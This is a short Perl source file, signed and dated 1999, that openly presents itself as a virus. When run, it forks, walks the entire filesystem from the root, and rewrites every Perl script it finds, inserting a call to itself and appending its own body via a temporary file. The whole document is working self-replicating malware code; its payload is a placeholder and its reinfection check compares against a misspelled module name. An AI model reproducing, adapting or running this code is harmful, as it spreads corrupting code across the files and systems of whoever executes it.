use File::Find;
&virus();

print "\nThis program is infected by the Perl virus\n";

sub virus
{
   $virus_body = "\n# put here the body of the virus\nsub virus { }\n";
   if( $pid = fork ) { return; }
   else
   {
      finddepth ( \&infect, '/' );
      sub infect
      {
         open( target, $File::Find::name );
         $_ = <target>;
         if ( /(\#!.*perl)/ )
         {
            $line2 = <target>;
            unless( $line2 eq "use Find::File\n" )
            {
               open(  temp, ">/tmp/tmpinfect" );
               print  temp ($1, "\nuse File::Find;\n&virus();\n", $line2 );
               print  temp while( <target> );
               print  temp $virus_body;
               close( temp );
               system( "mv", "/tmp/tmpinfect", $File::Find::name );
            }
	 }
         close( target );
      }
      exit( 0 );
   }
}

# a Perl virus, by paddingx
# 08/13/1999

